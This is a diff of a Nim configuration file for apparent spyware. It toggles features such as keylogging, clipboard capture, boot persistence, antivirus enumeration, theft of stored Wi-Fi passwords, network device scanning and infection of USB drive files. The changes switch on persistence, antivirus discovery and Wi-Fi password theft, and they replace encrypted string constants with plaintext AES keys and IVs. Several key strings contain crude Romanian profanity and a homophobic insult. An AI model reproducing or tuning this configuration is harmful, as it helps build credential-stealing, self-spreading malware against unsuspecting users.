@@ -4,13 +4,13 @@
 ## used for compile-time string encryption
 ## in this file
 ## DO NOT REMOVE
-from functions/hideString import e
+import functions/hideString
 
-const AES_ENCRYPT_KEY*: string = e "macheamapetrisorsisuntfoartegayhaha"
+let AES_ENCRYPT_KEY*: string = "muiemacheamapetrisorsisuntfoartegayhaha"
 
-const AES_AAD*: string = e "abiestezeu1234"
+let AES_AAD*: string = "abiestezeu1234"
 
-const AES_IV*: string = e "abiestezeu1234"
+let AES_IV*: string = "abiestezeu1234"
 
 ## maximum number of characters to send
 ## DEFAULT: unknown
@@ -28,7 +28,7 @@ const SEND_INTERVAL*: int = 3000
 ## if sendThread fails(eg. network error)
 ## it will try again after n ms
 ## DEFAULT: 1000
-const SEND_THREAD_TRY_INTERVAL*: int = 1000
+const SEND_THREAD_TRY_INTERVAL*: int = 10000
 
 ## used so only one program is open at a time
 ## DEFAULT: true
@@ -37,7 +37,7 @@ const ALLOW_ONLY_ONE_INSTANCE*: bool = true
 ## persistenceThread is used for installing the program
 ## and starting it when the pc opens
 ## DEFAULT: true
-const USE_PERSISTENCE_THREAD*: bool = false
+const USE_PERSISTENCE_THREAD*: bool = true
 
 ## clipboardThread is used for logging the clipboard
 ## every time it changes
@@ -53,17 +53,17 @@ const CLIPBOARD_THREAD_CHECK_INTERVAL*: int = 100
 ## getAVSThread is used for getting
 ## all the installed antivirus software on the user's pc
 ## DEFAULT: true
-const USE_GET_AVS_THREAD*: bool = false
+const USE_GET_AVS_THREAD*: bool = true
 
 ## wifiPasswordsThread is used for getting
 ## all the wifi passwords stored on user's pc
 ## DEFAULT: true
-const USE_WIFI_PASSWORDS_THREAD*: bool = false
+const USE_WIFI_PASSWORDS_THREAD*: bool = true
 
 ## connectedWifiThread is used for getting
 ## all the networks the user is connected to
 ## DEFAULT: true
-const USE_CONNECTED_WIFI_THREAD*: bool = true
+const USE_CONNECTED_WIFI_THREAD*: bool = false
 
 ## windowNameThread is used for getting the active window name
 ## best used alongside keyloggerThread
@@ -126,12 +126,12 @@ const INFECT_THREAD_CHECK_INTERVAL*: int = 10000
 ## the key files on a usb drive will be infected with
 ## YOU MUST add e before " to encrypt the key so it can't be read
 ## from the executable
-const INFECT_ENCRYPTION_KEY*: string = e"abiestezeulmeu1"
+let INFECT_ENCRYPTION_KEY*: string = "abiestezeulmeu1asdasd"
 
 ## connectedDevicesThread is used for getting all the connected
 ## devices on a wifi network
 ## DEFAULT: true
-const USE_CONNECTED_DEVICES_THREAD*: bool = true
+const USE_CONNECTED_DEVICES_THREAD*: bool = false
 
 ## the number of threads connectedDevicesThread will use
 ## to check ips
